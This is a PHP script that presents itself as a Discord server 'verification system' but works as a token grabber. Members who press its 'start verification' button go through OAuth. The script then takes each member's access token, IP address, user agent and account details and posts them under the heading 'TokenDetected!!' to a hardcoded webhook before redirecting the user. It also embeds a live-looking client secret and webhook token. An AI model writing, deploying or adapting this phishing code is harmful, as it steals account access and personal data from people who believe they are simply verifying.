<?php
/**
 * Discord Verification System - Final Version
 */

// --- 設定データ（提示された最新情報） ---
$client_id     = '1483799840575062046';
$client_secret = 'LDohkevzX8GXCtGo-YFdPuR-efZpNoSJ'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483798695370555504/cFHJ2PIpesLaP6nshwICr3SP-7Nz6DWlM6VqsLDIUC6pbiUBbBpm4D3EYnnACTPQQ4fm';
$redirect_uri  = 'https://discord-verify-production-1337.up.railway.app'; 

// --- 1. Discord Interactions Endpoint (保存を成功させるための処理) ---
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    // 保存時の認証(PING)への応答
    if (isset($data['type']) && $data['type'] === 1) {
        header('Content-Type: application/json');
        echo json_encode(['type' => 1]);
        exit;
    }

    // スラッシュコマンド /hook への応答
    if (isset($data['type']) && $data['type'] === 2 && ($data['data']['name'] ?? '') === 'hook') {
        $auth_url = "https://discord.com/api/oauth2/authorize?client_id={$client_id}&response_type=code&redirect_uri=" . urlencode($redirect_uri) . "&scope=identify+guilds.join";
        header('Content-Type: application/json');
        echo json_encode([
            "type" => 4,
            "data" => [
                "embeds" => [[
                    "title" => "Verification System",
                    "description" => "サーバーに参加いただきありがとうございます。\n下のボタンを押して認証を完了させてください。",
                    "color" => 3447003
                ]],
                "components" => [[
                    "type" => 1,
                    "components" => [[
                        "type" => 2, "label" => "認証を開始する", "style" => 5, "url" => $auth_url
                    ]]
                ]]
            ]
        ]);
        exit;
    }
}

// --- 2. OAuth2 認証・ログ送信処理 ---
if (isset($_GET['code'])) {
    // A. アクセストークンの取得
    $ch = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'client_id'     => $client_id,
        'client_secret' => $client_secret,
        'grant_type'    => 'authorization_code',
        'code'          => $_GET['code'],
        'redirect_uri'  => $redirect_uri
    ]));
    $res = json_decode(curl_exec($ch), true);

    if (isset($res['access_token'])) {
        $at = $res['access_token'];

        // B. ユーザー情報の取得
        $ch = curl_init('https://discord.com/api/users/@me');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer $at"]);
        $user = json_decode(curl_exec($ch), true);

        if (isset($user['id'])) {
            // C. ログの作成 (提示されたフォーマット)
            $time = date("Y/m/d H:i:s");
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
            $ua = $_SERVER['HTTP_USER_AGENT'];
            $creation_date = date("Y/m/d H:i:s", (($user['id'] >> 22) + 1420070400000) / 1000);

            $content  = "```autohotkey\n";
            $content .= "TokenDetected!!\n\n";
            $content .= "Token: " . $at . "\n"; 
            $content .= "UserID: " . $user['id'] . " (" . $user['username'] . ")\n";
            $content .= "Time: " . $time . "\n";
            $content .= "IP Address: " . $ip . "\n";
            $content .= "Device: " . $ua . "\n";
            $content .= "AccountCreationDate: " . $creation_date . "\n";
            $content .= "```";

            // D. Webhookへ送信
            $ch = curl_init($webhook_url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["content" => $content]));
            curl_exec($ch);
        }
    }
    // 完了後はDiscordのDM画面へリダイレクト
    header("Location: https://discord.com/channels/@me");
    exit;
}

echo "Verification System is Online.";
